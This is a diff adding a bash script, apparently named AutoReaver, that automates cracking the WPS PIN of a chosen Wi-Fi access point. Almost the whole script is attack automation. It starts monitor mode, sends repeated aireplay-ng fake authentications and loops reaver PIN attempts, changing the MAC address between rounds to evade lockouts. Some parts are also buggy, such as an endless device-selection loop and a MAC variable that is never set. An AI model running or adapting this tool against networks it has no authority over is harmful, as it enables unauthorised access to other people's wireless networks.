@@ -1,0 +1,287 @@
+#!/bin/bash
+
+source $(pwd)"/configurationSettings";
+
+clear;
+
+if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
+	echo "OOOOOPS! You've lost configuration file of AutoReaver: ./configurationSettings";
+	echo "Try to recover this file, or download default version from project site, and try again" && echo "";
+	exit;
+fi
+
+if [[ ! -d "$REAVER_TMP_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_TMP_DIR;
+fi
+
+if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_SESSION_DIR;
+fi
+
+if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
+        mkdir -p -m 700 $REAVER_CRACKED_DIR;
+fi
+
+###########################################################################################################################
+###################################################### FUNCTIONS ##########################################################
+###########################################################################################################################
+
+echoWhite(){
+	echo "$(tput setaf 7) ${1}$(tput sgr0)";
+}
+
+echoBlue(){
+	echo "$(tput setaf 4) ${1}$(tput sgr0)";
+}
+
+echoRed(){
+        echo "$(tput setaf 1) ${1}$(tput sgr0)";
+}
+
+setDeviceSettings(){
+	PATH_IEEE_ERROR=0;
+
+        if [ ! -d "$PATH_IEEE" ] || [ ! "$(ls -A $PATH_IEEE)" ]; then
+                echoRed "---------------------------";
+                echoRed "No WIFI Devices Detected!!!";
+                echoRed "---------------------------";
+                echo "" && exit;
+	fi
+
+	COUNT_DEV=0;
+	declare -a ARR_DEVICES;
+
+	for PHY in $(ls $PATH_IEEE); do
+	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
+	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c5-${#STR});
+	        DEVICE=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
+	        echoBlue "["$((COUNT_DEV+1))"] - "$PHY" - $DRIVER - $DEVICE";
+	        if [[ $COUNT_DEV == 0 ]]; then
+	                ARR_DEVICES[$COUNT_DEV]="$PHY";
+	                ARR_DEVICES[$(($COUNT_DEV+1))]="$DRIVER";
+	                ARR_DEVICES[$(($COUNT_DEV+2))]="$DEVICE";
+	        else
+	                ARR_DEVICES[$((${#ARR_DEVICES[@]}))]="$PHY";
+	                ARR_DEVICES[$((${#ARR_DEVICES[@]}+1))]="$DRIVER";
+	                ARR_DEVICES[$((${#ARR_DEVICES[@]}+2))]="$DEVICE";
+	        fi
+	        COUNT_DEV=$((COUNT_DEV+1));
+	done
+
+#echo "$COUNT_DEV";
+#echo "${ARR_DEVICES[@]}";
+#echo "The Array as ${#ARR_DEVICES[@]} Elements....";
+
+	while true; do
+	        read -p "Choose WIFI Device: " $DEV_CHOICE
+	done
+}
+
+setAPSettings(){
+        if [[ -z "$AP_CHANNEL" ]]; then
+		read -p "Set AP Channel: " AP_CHANNEL;
+        else
+                while true; do
+                        read -p "Use $AP_CHANNEL (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Set AP Channel: " AP_CHANNEL;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+
+        if [[ -z "$AP_BSSID" ]]; then
+		read -p "Set AP BSSID: " AP_BSSID;
+        else
+                while true; do
+                        read -p "Use $AP_BSSID (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Set AP BSSID: " AP_BSSID;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+
+        if [[ -z "$AP_ESSID" ]]; then
+		read -p "Set AP ESSID: " AP_ESSID;
+        else
+                while true; do
+                        read -p "Use $AP_ESSID (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Set AP ESSID: " AP_ESSID;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+}
+
+setReaverOpt(){
+        if [[ -z "$FAKE_AUTH_DELAY_SECONDS" ]]; then
+		read -p "Aireplay-ng Fake Authentication Delay (60): " FAKE_AUTH_DELAY_SECONDS;
+        else
+                while true; do
+                        read -p "Use $FAKE_AUTH_DELAY_SECONDS (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Aireplay-ng Fake Authentication Delay (60): " FAKE_AUTH_DELAY_SECONDS;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+
+        if [[ -z "$REAVER_PIN_ATTEMPTS" ]]; then
+		read -p "Reaver PIN Attempts before MAC Changing (MAX. 3): " REAVER_PIN_ATTEMPTS;
+        else
+                while true; do
+                        read -p "Use $REAVER_PIN_ATTEMPTS (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Reaver PIN Attempts before MAC Changing (MAX. 3): " REAVER_PIN_ATTEMPTS;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+
+        if [[ -z "$REAVER_ATTEMPT_DELAY" ]]; then
+		read -p "Reaver Delay Between PIN Attempts (0): " REAVER_ATTEMPT_DELAY;
+        else
+                while true; do
+                        read -p "Use $REAVER_ATTEMPT_DELAY (Y/N)? " yn;
+
+                        case $yn in
+                                [Yy]* )
+                                        break;;
+                                [Nn]* )
+					read -p "Reaver Delay Between PIN Attempts (0): " REAVER_ATTEMPT_DELAY;
+                                        break;;
+                                * )
+                        esac
+                done
+        fi
+}
+
+getRandomMac(){
+	ifconfig $MONITOR_NAME down;
+        echoBlue "Changing $MONITOR_NAME MAC......" && macchanger -r $1 $MONITOR_NAME;
+}
+
+resetDeviceDriver(){
+	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......" && modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER;
+}
+
+startMonitor(){
+	if [[ $AIRMON_CHECK_KILL == 0 ]]; then
+		echoBlue "Check Kill Processes Associated to AIRMON-NG......" && airmon-ng check kill;
+		AIRMON_CHECK_KILL=1;
+	fi
+
+	echoBlue "Starting Monitor Mode on $MONITOR_NAME......" && airmon-ng start $MONITOR_NAME $AP_CHANNEL;
+}
+
+###########################################################################################################################
+###################################################### END FUNCTIONS ######################################################
+###########################################################################################################################
+
+clear;
+
+while true; do
+	PROCEED=0;
+
+	echoWhite "Device Settings......";
+	setDeviceSettings;
+	echo "";
+	echoWhite "AP Settings......";
+	setAPSettings;
+	echo "";
+	echoWhite "Reaver/Aireply-ng Settings......";
+	setReaverOpt;
+	clear;
+
+	echoWhite "Device Settings ------------------------------------------------------";
+	echoBlue "Device Driver:					$WIFI_CARD_DRIVER";
+	echoBlue "Device Monitor:				$MONITOR_NAME";
+	echoWhite "AP Settings ----------------------------------------------------------";
+	echoBlue "AP Channel:					$AP_CHANNEL";
+	echoBlue "AP BSSID:					$AP_BSSID";
+	echoBlue "AP ESSID:					$AP_ESSID";
+	echoWhite "Reaver/Aireplay-ng Settings ------------------------------------------";
+	echoBlue "Aireplay-ng Fake Authentication Delay:		$FAKE_AUTH_DELAY_SECONDS";
+	echoBlue "Reaver PIN Attempts before MAC Changing:	$REAVER_PIN_ATTEMPTS";
+	echoBlue "Reaver Delay Between PIN Attempts:		$REAVER_ATTEMPT_DELAY";
+	echo "";
+
+	while true; do
+		read -p "Proceed (Y/N)?" yn;
+
+		case $yn in
+			[Yy]* )
+				PROCEED=1;
+				break;;
+			[Nn]* )
+				clear;
+				break;;
+			* )
+				echoBlue "Please Answer Yes or No......";;
+		esac
+	done
+
+	if [[ $PROCEED == 1 ]]; then
+		break;
+	fi
+done
+
+clear;
+
+AP_BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
+
+SESSIONFILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';
+
+resetDeviceDriver;
+getRandomMac;
+startMonitor;
+
+while true; do
+	CMD_FAKE_AUTH="terminator -e 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $MONITOR_NAME'";
+	eval $CMD_FAKE_AUTH &
+	sleep 4;
+
+	reaver -i $MONITOR_NAME -b $AP_BSSID --channel=$AP_CHANNEL --mac=$RND_MAC --session=$SESSIONFILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT';
+
+	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');
+
+	if [[ $REAVER_GET_KEY == 1 ]]; then
+		echoWhite "PIN Cracked......";
+		sleep 6 && clear;
+		break;
+	else
+		echoWhite "Failed to recover WPA key......";
+		sleep 4 && clear;
+	fi
+
+        resetDeviceDriver;
+	getRandomMac;
+        startMonitor;
+done
